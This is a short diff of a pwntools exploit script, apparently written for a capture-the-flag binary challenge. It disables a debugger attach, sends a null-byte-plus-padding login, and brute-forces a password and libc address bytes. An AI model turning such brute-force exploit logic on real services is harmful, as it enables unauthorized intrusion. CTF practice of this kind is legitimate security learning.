@@ -35,7 +35,7 @@ def exploit(flag):
     #brute force password
     log.info('Getting password...')
     psd = get_password()
-    gdb.attach(io)
+    #gdb.attach(io)
 
     io.sendline("1")
     login('\x00'+'1'*0x47)
@@ -44,7 +44,7 @@ def exploit(flag):
     io.sendlineafter('>> ',str(1))
     #brute force libc
     log.info('Getting libc...')
-    address = "\x39"
+    address = ""
     for i in range(0x4):
         for j in range(1,0x100):
             if j == '0xa':
